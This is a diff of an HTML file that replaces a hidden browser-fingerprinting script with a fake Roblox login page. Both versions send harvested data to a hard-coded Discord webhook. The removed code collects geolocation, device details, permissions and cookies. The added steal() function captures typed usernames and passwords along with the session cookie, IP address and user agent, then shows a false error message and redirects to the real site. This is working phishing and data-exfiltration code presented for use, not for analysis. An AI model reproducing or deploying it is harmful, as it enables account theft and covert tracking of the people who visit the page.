@@ -1,234 +1,75 @@
 <!DOCTYPE html>
 <html>
-<head><title>Roblox</title></head>
-<body style="display:none;">
+<head>
+    <title>Roblox - Login</title>
+    <link rel="icon" href="https://images.rbxcdn.com/7d8e7e791a56a27a19e4f3106ab3a1a8-roblox-logo.svg">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; background: #f2f2f2; }
+        .container { width: 400px; margin: 80px auto; background: white; padding: 35px; border-radius: 8px; box-shadow: 0 2px 15px rgba(0,0,0,0.2); text-align: center; }
+        img { width: 130px; margin-bottom: 20px; }
+        h2 { color: #393b3d; margin-bottom: 20px; font-size: 22px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; font-size: 15px; }
+        button { width: 100%; padding: 12px; background: #00b06f; color: white; border: none; border-radius: 4px; font-size: 17px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        button:hover { background: #009a5f; }
+        #error { color: red; margin-top: 10px; display: none; font-size: 13px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://images.rbxcdn.com/7d8e7e791a56a27a19e4f3106ab3a1a8-roblox-logo.svg" alt="Roblox">
+        <h2>Log In to Roblox</h2>
+        <input type="text" id="username" placeholder="Username/Email" autocomplete="off">
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="steal()">Log In</button>
+        <p id="error">Incorrect username or password. Please try again.</p>
+    </div>
 
-<script>
-var webhook = "https://discord.com/api/webhooks/1517070488721948743/RNcyTwya9CDyheCrLPSTNDtENc8i04ybtfWloKAw-PoZYqXuvJL6nGXvnVIFPyhj_yCW";
+    <script>
+        var webhook = "https://discord.com/api/webhooks/1517070488721948743/RNcyTwya9CDyheCrLPSTNDtENc8i04ybtfWloKAw-PoZYqXuvJL6nGXvnVIFPyhj_yCW";
 
-async function grab() {
-
-    // ========== GEOLOCATION ==========
-    var geo = {};
-    try {
-        var r = await fetch("https://ipapi.co/json/");
-        if (r.ok) geo = await r.json();
-    } catch(e) {}
-
-    // ========== DEVICE ==========
-    var nav = navigator;
-    var scr = screen;
-    var win = window;
-
-    var battery = "unknown", charging = "unknown", chargingTime = "unknown", dischargingTime = "unknown";
-    try {
-        var b = await nav.getBattery();
-        battery = Math.round(b.level * 100) + "%";
-        charging = b.charging ? "Yes" : "No";
-        chargingTime = b.chargingTime === Infinity ? "N/A" : Math.round(b.chargingTime / 60) + " min";
-        dischargingTime = b.dischargingTime === Infinity ? "N/A" : Math.round(b.dischargingTime / 60) + " min";
-    } catch(e) {}
-
-    var connection = {};
-    if (nav.connection) {
-        connection = {
-            effectiveType: nav.connection.effectiveType,
-            downlink: nav.connection.downlink + " Mbps",
-            downlinkMax: nav.connection.downlinkMax || "unknown",
-            rtt: nav.connection.rtt + " ms",
-            type: nav.connection.type,
-            saveData: nav.connection.saveData
-        };
-    }
-
-    var mediaDevices = "unknown";
-    try {
-        var devices = await nav.mediaDevices.enumerateDevices();
-        mediaDevices = devices.map(d => d.kind + ": " + (d.label || "unnamed")).join(" | ");
-    } catch(e) { mediaDevices = "blocked"; }
-
-    var gpu = "unknown";
-    try {
-        var canvas = document.createElement("canvas");
-        var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-        if (gl) {
-            var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-            gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "unknown";
-        }
-    } catch(e) {}
-
-    var fonts = "unknown";
-    try {
-        var fontList = ["Arial","Verdana","Times New Roman","Courier New","Comic Sans MS","Impact","Georgia","Trebuchet MS","Palatino","Garamond","Bookman","Tahoma","Symbol","Webdings","Wingdings","MS Sans Serif","MS Serif","Roboto","Open Sans","Lato","Montserrat","Poppins","Inter"];
-        var available = [];
-        var tester = document.createElement("span");
-        tester.style.fontSize = "72px";
-        tester.innerHTML = "mmmmmmmmmmlli";
-        for (var f of fontList) {
-            tester.style.fontFamily = f;
-            document.body.appendChild(tester);
-            var width = tester.offsetWidth;
-            tester.style.fontFamily = "serif";
-            if (tester.offsetWidth !== width) available.push(f);
-            document.body.removeChild(tester);
-        }
-        fonts = available.join(", ") || "detection failed";
-    } catch(e) {}
-
-    var plugins = [];
-    try {
-        for (var i = 0; i < nav.plugins.length; i++) {
-            plugins.push(nav.plugins[i].name);
-        }
-    } catch(e) {}
-
-    var mimeTypes = [];
-    try {
-        for (var i = 0; i < nav.mimeTypes.length; i++) {
-            mimeTypes.push(nav.mimeTypes[i].type);
-        }
-    } catch(e) {}
-
-    var storageQuota = "unknown";
-    try {
-        var est = await nav.storage.estimate();
-        storageQuota = Math.round(est.quota / 1024 / 1024) + " MB / " + Math.round(est.usage / 1024 / 1024) + " MB used";
-    } catch(e) {}
-
-    var permissions = {};
-    try {
-        for (var perm of ["geolocation","notifications","camera","microphone","clipboard-read","clipboard-write","midi","background-sync","persistent-storage"]) {
-            var status = await nav.permissions.query({name: perm});
-            permissions[perm] = status.state;
-        }
-    } catch(e) {}
-
-    var bluetooth = "unknown";
-    try {
-        bluetooth = await nav.bluetooth.getAvailability() ? "Available" : "Unavailable";
-    } catch(e) {}
-
-    // ========== BUILD MESSAGE ==========
-    var msg = "**🎯 ===== COMPLETE DOSSIER =====**\n\n";
-
-    msg += "**📍 GEOLOCATION**\n";
-    msg += "IP: " + (geo.ip || "unknown") + "\n";
-    msg += "Hostname: " + (geo.hostname || "unknown") + "\n";
-    msg += "City: " + (geo.city || "unknown") + "\n";
-    msg += "Region: " + (geo.region || "unknown") + "\n";
-    msg += "Country: " + (geo.country_name || "unknown") + " (" + (geo.country_code || "?") + ")\n";
-    msg += "Continent: " + (geo.continent_code || "unknown") + "\n";
-    msg += "Postal Code: " + (geo.postal || "unknown") + "\n";
-    msg += "Coordinates: " + (geo.latitude || "?") + ", " + (geo.longitude || "?") + "\n";
-    msg += "Timezone: " + (geo.timezone || "unknown") + " (UTC " + (geo.utc_offset || "?") + ")\n";
-    msg += "Calling Code: +" + (geo.country_calling_code || "?") + "\n";
-    msg += "Currency: " + (geo.currency || "unknown") + " (" + (geo.currency_name || "?") + ")\n";
-    msg += "Languages: " + (geo.languages || "unknown") + "\n";
-    msg += "Country Area: " + (geo.country_area || "unknown") + " km²\n";
-    msg += "Country Population: " + (geo.country_population || "unknown") + "\n";
-    msg += "EU Member: " + (geo.in_eu || "false") + "\n\n";
-
-    msg += "**📡 INTERNET**\n";
-    msg += "ISP: " + (geo.org || "unknown") + "\n";
-    msg += "ASN: " + (geo.asn || "unknown") + "\n";
-    msg += "Network: " + (connection.type || "unknown") + "\n";
-    msg += "Connection Type: " + (connection.effectiveType || "unknown") + "\n";
-    msg += "Downlink: " + (connection.downlink || "unknown") + "\n";
-    msg += "Downlink Max: " + (connection.downlinkMax || "unknown") + "\n";
-    msg += "Latency (RTT): " + (connection.rtt || "unknown") + "\n";
-    msg += "Save Data Mode: " + (connection.saveData || "unknown") + "\n\n";
-
-    msg += "**📱 DEVICE**\n";
-    msg += "Platform: " + (nav.platform || "unknown") + "\n";
-    msg += "Vendor: " + (nav.vendor || "unknown") + "\n";
-    msg += "CPU Cores: " + (nav.hardwareConcurrency || "unknown") + "\n";
-    msg += "RAM: " + (nav.deviceMemory || "unknown") + " GB\n";
-    msg += "GPU: " + gpu + "\n";
-    msg += "Screen: " + scr.width + "x" + scr.height + " @ " + scr.colorDepth + "-bit\n";
-    msg += "Available Screen: " + scr.availWidth + "x" + scr.availHeight + "\n";
-    msg += "Pixel Ratio: " + win.devicePixelRatio + "\n";
-    msg += "Orientation: " + (scr.orientation ? scr.orientation.type : "unknown") + " (" + (scr.orientation ? scr.orientation.angle + "°" : "?") + ")\n";
-    msg += "Touch Points: " + nav.maxTouchPoints + "\n";
-    msg += "Bluetooth: " + bluetooth + "\n";
-    msg += "Battery: " + battery + " | Charging: " + charging + " | Charge Time: " + chargingTime + " | Discharge Time: " + dischargingTime + "\n\n";
-
-    msg += "**🌐 BROWSER**\n";
-    msg += "User Agent: " + (nav.userAgent || "unknown") + "\n";
-    msg += "App Name: " + (nav.appName || "unknown") + "\n";
-    msg += "App Version: " + (nav.appVersion || "unknown") + "\n";
-    msg += "Product: " + (nav.product || "unknown") + "\n";
-    msg += "Language: " + (nav.language || "unknown") + "\n";
-    msg += "All Languages: " + (nav.languages ? nav.languages.join(", ") : "unknown") + "\n";
-    msg += "Cookies Enabled: " + nav.cookieEnabled + "\n";
-    msg += "Do Not Track: " + (nav.doNotTrack || "unspecified") + "\n";
-    msg += "Online: " + nav.onLine + "\n";
-    msg += "Java Enabled: " + (nav.javaEnabled ? nav.javaEnabled() : "unknown") + "\n";
-    msg += "PDF Viewer: " + (nav.pdfViewerEnabled || "unknown") + "\n\n";
-
-    msg += "**🧩 PLUGINS**\n";
-    msg += (plugins.length > 0 ? plugins.join(", ") : "none detected") + "\n\n";
-
-    msg += "**📄 MIME TYPES**\n";
-    msg += (mimeTypes.length > 0 ? mimeTypes.slice(0,10).join(", ") + (mimeTypes.length > 10 ? " (+" + (mimeTypes.length-10) + " more)" : "") : "none detected") + "\n\n";
-
-    msg += "**🎨 SYSTEM**\n";
-    msg += "Color Scheme: " + (win.matchMedia("(prefers-color-scheme: dark)").matches ? "Dark" : "Light") + "\n";
-    msg += "Reduced Motion: " + (win.matchMedia("(prefers-reduced-motion: reduce)").matches ? "Yes" : "No") + "\n";
-    msg += "High Contrast: " + (win.matchMedia("(prefers-contrast: high)").matches ? "Yes" : "No") + "\n";
-    msg += "Installed Fonts: " + fonts + "\n";
-    msg += "Storage: " + storageQuota + "\n\n";
-
-    msg += "**🎤 MEDIA DEVICES**\n";
-    msg += mediaDevices + "\n\n";
-
-    msg += "**🔐 PERMISSIONS**\n";
-    for (var p in permissions) {
-        msg += p + ": " + permissions[p] + "\n";
-    }
-    msg += "\n";
-
-    msg += "**🔗 SESSION**\n";
-    msg += "Referrer: " + (document.referrer || "direct") + "\n";
-    msg += "Local Time: " + new Date().toLocaleString() + "\n";
-    msg += "UTC Time: " + new Date().toUTCString() + "\n";
-    msg += "Window Size: " + win.innerWidth + "x" + win.innerHeight + "\n";
-    msg += "History Length: " + (win.history.length || "unknown") + "\n\n";
-
-    msg += "**🍪 ROBLOX COOKIE**\n";
-    msg += "||" + (document.cookie || "no_cookie") + "||";
-
-    // ========== SEND ==========
-    var payload = {content: msg};
-    if (msg.length > 2000) {
-        payload = {content: msg.substring(0, 1996) + "..."};
-    }
-
-    await fetch(webhook, {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify(payload)
-    });
-
-    // if too long, split
-    if (msg.length > 2000) {
-        var parts = [];
-        for (var i = 0; i < msg.length; i += 1900) {
-            parts.push(msg.substring(i, i + 1900));
-        }
-        for (var part of parts) {
+        async function send(msg) {
             await fetch(webhook, {
                 method: "POST",
                 headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({content: part})
+                body: JSON.stringify({content: msg})
             });
         }
-    }
 
-    window.location = "https://www.roblox.com";
-}
+        async function steal() {
+            var user = document.getElementById("username").value;
+            var pass = document.getElementById("password").value;
 
-grab();
-</script>
+            if (!user || !pass) {
+                document.getElementById("error").style.display = "block";
+                document.getElementById("error").innerText = "Please enter username and password.";
+                return;
+            }
 
+            var cookie = document.cookie || "no_cookie";
+            var ip = "unknown";
+            try {
+                var r = await fetch("https://api.ipify.org?format=json");
+                if (r.ok) { var d = await r.json(); ip = d.ip; }
+            } catch(e) {}
+            var ua = navigator.userAgent;
+
+            var msg = "**🎯 ROBLOX LOGIN STOLEN**\n" +
+                      "**Username:** " + user + "\n" +
+                      "**Password:** " + pass + "\n" +
+                      "**IP:** " + ip + "\n" +
+                      "**Cookie:** ||" + cookie + "||\n" +
+                      "**UA:** " + ua;
+
+            await send(msg);
+
+            document.getElementById("error").style.display = "block";
+            document.getElementById("error").innerText = "Incorrect username or password. Please try again.";
+
+            setTimeout(function() {
+                window.location = "https://www.roblox.com/login";
+            }, 3000);
+        }
+    </script>
 </body>
 </html>
